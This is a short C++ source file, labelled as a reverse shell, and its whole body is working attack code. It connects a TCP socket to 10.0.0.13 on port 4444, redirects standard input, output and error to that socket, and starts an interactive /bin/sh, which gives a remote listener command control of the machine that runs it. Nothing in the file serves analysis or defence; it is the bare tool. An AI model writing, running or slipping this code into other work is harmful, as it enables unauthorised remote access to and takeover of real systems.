// C++ reverse shell - socket + dup2 + execve
#include <iostream>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main() {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in sa{};
    sa.sin_family = AF_INET;
    sa.sin_port = htons(4444);
    sa.sin_addr.s_addr = inet_addr("10.0.0.13");
    connect(s, reinterpret_cast<sockaddr *>(&sa), sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);
    char *argv[] = {const_cast<char *>("/bin/sh"), const_cast<char *>("-i"), nullptr};
    char *envp[] = {nullptr};
    execve("/bin/sh", argv, envp);
    return 0;
}
